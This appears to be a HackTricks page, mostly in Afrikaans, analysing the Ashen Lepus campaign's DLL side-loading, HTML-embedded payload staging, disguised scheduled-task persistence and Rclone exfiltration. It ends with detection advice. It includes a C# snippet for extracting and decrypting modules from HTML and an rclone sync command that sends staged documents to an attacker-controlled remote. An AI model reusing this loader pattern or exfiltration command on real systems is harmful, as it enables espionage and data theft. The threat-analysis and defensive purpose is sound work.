# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig van Tradecraft

Ashen Lepus (aka WIRTE) het 'n herhaalbare patroon uitgebuit wat DLL sideloading, staged HTML payloads, en modulêre .NET backdoors aaneenskakel om in Midde-Oosterse diplomatieke netwerke te bly voortbestaan. Die tegniek is deur enige operateur herbruikbaar omdat dit staatmaak op:

- **Archive-based social engineering**: onskadelike PDFs instrueer teikens om 'n RAR-argief van 'n lêerdeelwebwerf af te laai. Die argief bundel 'n oortuigende dokumentkyker EXE, 'n kwaadwillige DLL met die naam van 'n vertroude biblioteek (bv. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), en 'n lok `Document.pdf`.
- **DLL search order abuse**: die slagoffer dubbelklik die EXE, Windows los die DLL-import vanaf die huidige gids op, en die kwaadwillige loader (AshenLoader) voer binne die vertroude proses uit terwyl die lok-PDF oopmaak om verdagtheid te voorkom.
- **Living-off-the-land staging**: elke latere fase (AshenStager → AshenOrchestrator → modules) word buite die skyf gehou totdat dit nodig is, gelewer as versleutelde blobs weggesteek binne andersins onskadelike HTML-antwoorde.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: die EXE side-loads AshenLoader, wat host recon uitvoer, dit met AES-CTR enkripteer, en dit POST binne ronddraaiende parameters soos `token=`, `id=`, `q=`, of `auth=` na API-agtige paaie (bv. `/api/v2/account`).
2. **HTML extraction**: die C2 gee slegs die volgende fase prys wanneer die kliënt-IP na die teikengebied gegeolokaliseer word en die `User-Agent` met die implant ooreenstem, wat sandboxes frustreer. Wanneer die kontroles slaag, bevat die HTTP-lichaam 'n `<headerp>...</headerp>`-blob met die Base64/AES-CTR-versleutelde AshenStager-payload.
3. **Second sideload**: AshenStager word ontplooi saam met 'n ander wettige binêre wat `wtsapi32.dll` importeëer. Die kwaadwillige kopie wat in die binêre geïnjekteer is, haal meer HTML op en onttrek hierdie keer `<article>...</article>` om AshenOrchestrator te herwin.
4. **AshenOrchestrator**: 'n modulêre .NET-beheerder wat 'n Base64 JSON-konfigurasie decodeer. Die konfig se velde `tg` en `au` word aangeheg/gehash tot die AES-sleutel, wat `xrk` ontsleutel. Die resulterende bytes dien as 'n XOR-sleutel vir elke module-blob wat daarna opgehaal word.
5. **Module delivery**: elke module word beskryf deur HTML-kommentaar wat die parser na 'n arbitrêre tag herlei, wat statiese reëls breek wat slegs na `<headerp>` of `<article>` kyk. Modules sluit in persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), en file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Selfs as verdedigers 'n spesifieke element blokkeer of verwyder, hoef die operateur net die tag wat in die HTML-opmerking aangedui is te verander om lewering te hervat.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: huidige loaders bevat 256-bit sleutels plus nonces (bv., `{9a 20 51 98 ...}`) en voeg opsioneel 'n XOR-laag by deur strings soos `msasn1.dll` voor/na decryptie te gebruik.
- **Recon smuggling**: geënumeerde data sluit nou Program Files-lyste in om hoë-waarde apps te identifiseer en word altyd versleuteld voordat dit die gasheer verlaat.
- **URI churn**: query parameters and REST paths draai tussen veldtogte (`/api/v1/account?token=` → `/api/v2/account?auth=`), wat brose deteksies ongeldig maak.
- **Gated delivery**: bedieners is geo-afgebaken en antwoord slegs op werklike implants. Nie-goedgekeurde kliënte ontvang onopvallende HTML.

## Persistence & Execution Loop

AshenStager plaas geplande take wat as Windows-onderhoudsopdragte vermom is en via `svchost.exe` uitgevoer word, bv.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Hierdie take herbegin die sideloading chain by opstart of op intervalle, wat verseker dat AshenOrchestrator vars modules kan versoek sonder om weer die skyf aan te raak.

## Using Benign Sync Clients for Exfiltration

Operateurs plaas diplomatieke dokumente in `C:\Users\Public` (openlik leesbaar en nie-verdagtig) via 'n toegewyde module, en laai dan die legitieme [Rclone](https://rclone.org/) binary af om daardie gids met aanvallerberging te sinkroniseer:

1. **Stage**: kopieer/versamel teikendokumente in `C:\Users\Public\{campaign}\`.
2. **Configure**: stuur 'n Rclone-konfigurasie wat na 'n aanvaller-beheerde HTTPS-endpoint wys (bv., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` sodat die verkeer soos normale cloud backups lyk.

Omdat Rclone wyd gebruik word vir wettige rugsteunwerkvloei, moet verdedigers fokus op anomalieë in uitvoering (nuwe binaries, vreemde remotes, of skielike sinkronisering van `C:\Users\Public`).

## Detection Pivots

- Waarsku op **signed processes** wat onverwags DLLs vanaf gebruikers-wysigbare paaie laai (Procmon filters + `Get-ProcessMitigation -Module`), veral wanneer die DLL-name oorvleuel met `netutils`, `srvcli`, `dwampi`, of `wtsapi32`.
- Inspekteer verdagte HTTPS-antwoorde vir **groot Base64-blokke ingebed binne ongebruiklike tags** of beveilig deur `<!-- TAG: <xyz> -->` opmerkings.
- Jaag na **geplande take** wat `svchost.exe` met nie-diens-argumente uitvoer of terugwys na dropper-gidse.
- Monitor vir **Rclone** binaries wat buite IT-beheerde plekke verskyn, nuwe `rclone.conf`-lêers, of sinkjobs wat vanaf staging-gidse soos `C:\Users\Public` trek.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
